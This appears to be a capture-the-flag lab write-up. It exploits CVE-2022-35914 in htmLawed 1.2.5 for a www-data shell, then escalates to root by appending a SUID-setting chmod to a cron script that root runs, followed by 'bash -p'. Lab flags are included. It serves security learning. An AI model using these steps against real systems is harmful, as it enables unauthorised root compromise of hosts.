My IP: 192.168.45.195
Target IP: 192.168.102.190

nmap:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: htmLawed (1.2.5) test
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Port 22: If we can get creds we can exploit this!

Port 80: Lets browse around and see what we can find
- We find at the top of the page there is a version number -> 1.2.5, this also can be found within our nmap scan. 
- We find [CVE-2022-35914](https://github.com/cosad3s/CVE-2022-35914-poc). I had trouble getting this exploit to run as it kept saying this web server wasn't vulnerable however, after observing the code, the reason was because the filepath embeded in the code was calling something that was not on the live server. 
	- `uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"`
	- The fix was to just leave the double quotes empty since there is no further file paths...i suppose this could have been noticed when we got nothing back other than index.php in my gobuster output, and whenever I tested the default command in the text box, it resolved to an error page under the supposed htmLawedTest.php file 
![[Pasted image 20260710125558.png]]![[Pasted image 20260710125611.png]]The command ended up working and we are in as www-data. From here we find the first flag -> `9a0d13063cf91c8a44ea6660f36be2c8
`
- tried sudo -l and it asked for a password so i decided to run Linpeas.
	- Linpeas revealed this:
```
Interesting writable files owned by me or writable by everyone (not in Home) (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/run/lock
/run/lock/apache2
/tmp
/tmp/cf31-probe-1351.py
/tmp/cf31-probe-29667.py
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/tmp
/var/www/cleanup.sh

```

- Whilst highlighting the the cleanup.sh file. However checking `/etc/crontab` and `ls -la /etc/cron.*` , and `cat /var/spool/cron/crontabs/root` we dont see this file. As of fact when we run `cat /var/spool/cron/crontabs/root` we recieved a permissions denied, so the only way to tell if this file was actually being run by root on a schedule was to watch the processes live -> pspy.

After about a minute pspy caught the cron job firing:
```
UID=0  PID=72876 | /usr/sbin/CRON -f
UID=0  PID=72878 | /bin/sh -c /var/www/cleanup.sh
UID=0  PID=72879 | rm -rf /var/log/apache2/error.log
UID=0  PID=72880 | rm -rf /var/log/apache2/access.log
```
So UID=0 (root) runs `/var/www/cleanup.sh` every minute via cron. Thats the confirmation -> a file I can write to, executed by root. 

Next I confirmed I could actually write to it:
```
ls -l /var/www/cleanup.sh
```
I had write access, so I appended a line to set the SUID bit on /bin/bash:
```
echo "chmod u+s /bin/bash" >> /var/www/cleanup.sh
```
Since root runs the script, root runs my chmod -> and root then changes perms on /bin/bash. Waited for the next minute tick, then:
```
ls -l /bin/bash
-rwsr-xr-x 1 root root 1.2M ... /bin/bash    <- the 's' = SUID bit is now set

/bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```


Root flag -> a2a57aa689d9db40e19c708a6f9ab8f4
